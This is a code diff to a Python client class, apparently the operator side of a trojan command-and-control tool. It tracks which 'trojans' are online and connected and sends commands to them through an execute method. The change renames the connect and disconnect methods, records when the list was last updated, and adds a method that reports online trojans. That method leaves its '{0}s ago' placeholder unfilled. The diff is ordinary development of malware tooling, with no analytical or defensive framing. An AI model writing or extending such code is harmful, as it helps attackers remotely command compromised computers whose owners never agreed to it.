@@ -14,6 +14,7 @@ class FlowControlClient(TCPClient):
         super(FlowControlClient, self).__init__(serverip)
         self.available = []
         self.connected = []
+        self.last_update = None
         self.end_seq = "<|end|>"
 
     def ping(self):
@@ -39,6 +40,7 @@ class FlowControlClient(TCPClient):
         self.receive_buffer.remove(self.end_seq)
         reply = self.receive()
         self.available = reply.split(",")
+        self.last_update = time.time()
 
     def execute(self, command):
         """
@@ -53,7 +55,7 @@ class FlowControlClient(TCPClient):
         prefix = prefix[:-1] + "]"
         self.send(prefix + command)
 
-    def connect(self, *names):
+    def add(self, *names):
         """
         adds the names given to the list of connected trojans, in case they are online
         :param names: (string)
@@ -63,7 +65,7 @@ class FlowControlClient(TCPClient):
             if name in self.available:
                 self.connected.append(name)
 
-    def disconnect(self, *names):
+    def remove(self, *names):
         """
         removes the names given from the list of connected trojans, in case they are even connected
         :param names: (string)
@@ -72,3 +74,13 @@ class FlowControlClient(TCPClient):
         for name in names:
             if name in self.connected:
                 self.connected.remove(name)
+
+    def get_info_available(self):
+        """
+        returns a list of currently online trojans
+        :return: (string)
+        """
+        string = "The following trojans are online, requested {0}s ago\n"
+        for name in self.available:
+            string += " - {0}\n".format(name)
+        return string
